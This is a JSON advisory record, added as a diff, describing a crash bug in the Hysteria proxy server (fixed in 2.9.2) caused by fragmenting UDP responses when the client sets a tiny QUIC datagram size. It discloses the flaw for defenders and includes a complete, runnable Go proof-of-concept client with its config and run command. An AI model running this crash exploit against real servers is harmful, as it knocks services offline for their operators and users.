@@ -1,0 +1,42 @@
+{
+  "id": "GHSA-qh5x-rfwf-rvfv",
+  "modified": "2026-06-26T20:15:09.258196847Z",
+  "published": "2026-06-26T19:58:12Z",
+  "summary": "Hysteria vulnerable to server crash when max_datagram_frame_size very small",
+  "details": "### Summary\n\nAn authenticated client can crash the Hysteria server by advertising a very small QUIC `max_datagram_frame_size` and then triggering a UDP response from the server. When the server tries to send the UDP response back via QUIC DATAGRAM, quic-go returns `DatagramTooLargeError`. The server then attempts to fragment the Hysteria UDP message, but the fragmentation code does not handle the case where the UDP message header itself is larger than the maximum datagram payload size. This results in a slice bounds panic and terminates the server process.\n\n### Details\n\n\nThe vulnerable path is the normal server-side UDP response path:\n\n```text\nudpSessionEntry.receiveLoop\n  -\u003e sendMessageAutoFrag\n    -\u003e frag.FragUDPMessage\n```\n\nIn `core/server/udp.go`, `receiveLoop` packages a UDP response into a `protocol.UDPMessage` and calls `sendMessageAutoFrag`. If `SendDatagram` fails with `quic.DatagramTooLargeError`, `sendMessageAutoFrag` calls:\n\n```go\nfMsgs := frag.FragUDPMessage(msg, int(errTooLarge.MaxDatagramPayloadSize))\n```\n\nHowever, `FragUDPMessage` in `core/internal/frag/frag.go` assumes that `maxSize` is greater than the UDP message header size:\n\n```go\nmaxPayloadSize := maxSize - m.HeaderSize()\n```\n\nIf an attacker-controlled client advertises a small enough `max_datagram_frame_size`, `errTooLarge.MaxDatagramPayloadSize` can be smaller than `m.HeaderSize()`. In that case, `maxPayloadSize` becomes zero or negative, and the later slicing operation panics:\n\n```go\nfrag.Data = fullPayload[off : off+payloadSize]\n```\n\n\n### PoC\n\npoc.yaml\n\n```yaml\nlisten: 127.0.0.1:8443\n\ntls:\n  cert: poc_server.crt\n  key: poc_server.key\n\nauth:\n  type: password\n  password: udp-frag-panic-poc\n\n\nmasquerade:\n  type: string\n  string:\n    content: nope\n    statusCode: 404\n```\n\npoc.go\n\n```go\n//go:build poc\n\npackage main\n\nimport (\n\t\"bytes\"\n\t\"context\"\n\t\"crypto/tls\"\n\t\"encoding/binary\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io\"\n\t\"net\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"time\"\n\n\t\"github.com/apernet/quic-go\"\n\t\"github.com/apernet/quic-go/http3\"\n\t\"github.com/apernet/quic-go/quicvarint\"\n)\n\nconst (\n\tauthHost = \"hysteria\"\n\tauthPath = \"/auth\"\n\tauthOK   = 233\n)\n\nfunc main() {\n\tserver := flag.String(\"server\", \"127.0.0.1:8443\", \"Hysteria server address\")\n\tauth := flag.String(\"auth\", \"\", \"Hysteria auth/password\")\n\ttarget := flag.String(\"target\", \"127.0.0.1:19090\", \"UDP target reachable from the server\")\n\tmaxDatagram := flag.Int64(\"max-datagram\", 20, \"QUIC max_datagram_frame_size advertised by this client\")\n\tinsecure := flag.Bool(\"insecure\", true, \"skip TLS verification\")\n\techo := flag.Bool(\"echo\", true, \"start a local UDP echo server on --target\")\n\tflag.Parse()\n\n\tif *auth == \"\" {\n\t\tpanic(\"--auth is required\")\n\t}\n\tif *echo {\n\t\tcloseEcho := startUDPEcho(*target)\n\t\tdefer closeEcho()\n\t}\n\n\tconn, cleanup := dialAndAuth(*server, *auth, *insecure, *maxDatagram)\n\tdefer cleanup()\n\n\tmsg := hysteriaUDPMessage(1, *target, []byte(\"X\"))\n\tfmt.Printf(\"[*] authenticated, target=%s, headerSize=%d, datagramSize=%d, advertisedMaxDatagram=%d\\n\",\n\t\t*target, udpHeaderSize(*target), len(msg), *maxDatagram)\n\n\tif err := conn.SendDatagram(msg); err != nil {\n\t\tpanic(fmt.Errorf(\"send trigger datagram: %w\", err))\n\t}\n\tfmt.Println(\"[+] trigger sent; vulnerable server should panic in frag.FragUDPMessage\")\n\n\tctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)\n\tdefer cancel()\n\tif _, err := conn.ReceiveDatagram(ctx); err != nil {\n\t\tfmt.Printf(\"[*] receive after trigger: %v\\n\", err)\n\t} else {\n\t\tfmt.Println(\"[!] received a response; try a smaller --max-datagram\")\n\t}\n}\n\nfunc dialAndAuth(server, auth string, insecure bool, maxDatagram int64) (*quic.Conn, func()) {\n\tserverAddr, err := net.ResolveUDPAddr(\"udp\", server)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tudpConn, err := net.ListenUDP(\"udp\", nil)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\ttransport := \u0026quic.Transport{Conn: udpConn}\n\tvar qconn *quic.Conn\n\trt := \u0026http3.Transport{\n\t\tTLSClientConfig: \u0026tls.Config{InsecureSkipVerify: insecure},\n\t\tQUICConfig: \u0026quic.Config{\n\t\t\tEnableDatagrams:      true,\n\t\t\tMaxDatagramFrameSize: maxDatagram,\n\t\t\tDisablePathManager:   true,\n\t\t},\n\t\tDial: func(ctx context.Context, _ string, tlsCfg *tls.Config, cfg *quic.Config) (*quic.Conn, error) {\n\t\t\tqconn, err = transport.DialEarly(ctx, serverAddr, tlsCfg, cfg)\n\t\t\treturn qconn, err\n\t\t},\n\t}\n\n\treq := \u0026http.Request{\n\t\tMethod: http.MethodPost,\n\t\tHost:   authHost,\n\t\tURL:    \u0026url.URL{Scheme: \"https\", Host: authHost, Path: authPath},\n\t\tHeader: http.Header{},\n\t\tBody:   io.NopCloser(bytes.NewReader(nil)),\n\t}\n\treq.Header.Set(\"Hysteria-Auth\", auth)\n\treq.Header.Set(\"Hysteria-CC-RX\", \"0\")\n\n\tctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)\n\tdefer cancel()\n\tresp, err := rt.RoundTrip(req.WithContext(ctx))\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer resp.Body.Close()\n\tif resp.StatusCode != authOK {\n\t\tpanic(fmt.Errorf(\"auth failed: HTTP status %d\", resp.StatusCode))\n\t}\n\tif resp.Header.Get(\"Hysteria-UDP\") == \"false\" {\n\t\tpanic(\"server reports UDP disabled\")\n\t}\n\n\tcleanup := func() {\n\t\t_ = rt.Close()\n\t\t_ = transport.Close()\n\t\t_ = udpConn.Close()\n\t\tif qconn != nil {\n\t\t\t_ = qconn.CloseWithError(0, \"\")\n\t\t}\n\t}\n\treturn qconn, cleanup\n}\n\nfunc hysteriaUDPMessage(sessionID uint32, addr string, data []byte) []byte {\n\tbuf := make([]byte, udpHeaderSize(addr)+len(data))\n\tbinary.BigEndian.PutUint32(buf[0:4], sessionID)\n\t// PacketID=0, FragID=0, FragCount=1.\n\tbuf[7] = 1\n\ti := len(quicvarint.Append(buf[:8], uint64(len(addr))))\n\ti += copy(buf[i:], addr)\n\tcopy(buf[i:], data)\n\treturn buf\n}\n\nfunc udpHeaderSize(addr string) int {\n\treturn 8 + quicvarint.Len(uint64(len(addr))) + len(addr)\n}\n\nfunc startUDPEcho(addr string) func() {\n\tpc, err := net.ListenPacket(\"udp\", addr)\n\tif err != nil {\n\t\tpanic(fmt.Errorf(\"start UDP echo on %s: %w\", addr, err))\n\t}\n\tfmt.Printf(\"[*] UDP echo listening on %s\\n\", pc.LocalAddr())\n\n\tgo func() {\n\t\tbuf := make([]byte, 2048)\n\t\tfor {\n\t\t\tn, raddr, err := pc.ReadFrom(buf)\n\t\t\tif err != nil {\n\t\t\t\treturn\n\t\t\t}\n\t\t\t_, _ = pc.WriteTo(buf[:n], raddr)\n\t\t}\n\t}()\n\treturn func() { _ = pc.Close() }\n}\n```\n\npoc.sh\n```bash\ngo run -tags poc ./poc_udp_frag_panic.go \\\n  --server 127.0.0.1:8443 \\\n  --auth udp-frag-panic-poc \\\n  --insecure \\\n  --target 127.0.0.1:19090 \\\n  --max-datagram 20\n```\n\n\n\n### Impact\nServer crash",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/apernet/hysteria",
+        "purl": "pkg:golang/github.com/apernet/hysteria"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.9.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-qh5x-rfwf-rvfv/GHSA-qh5x-rfwf-rvfv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/apernet/hysteria/security/advisories/GHSA-qh5x-rfwf-rvfv"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/apernet/hysteria"
+    }
+  ]
+}
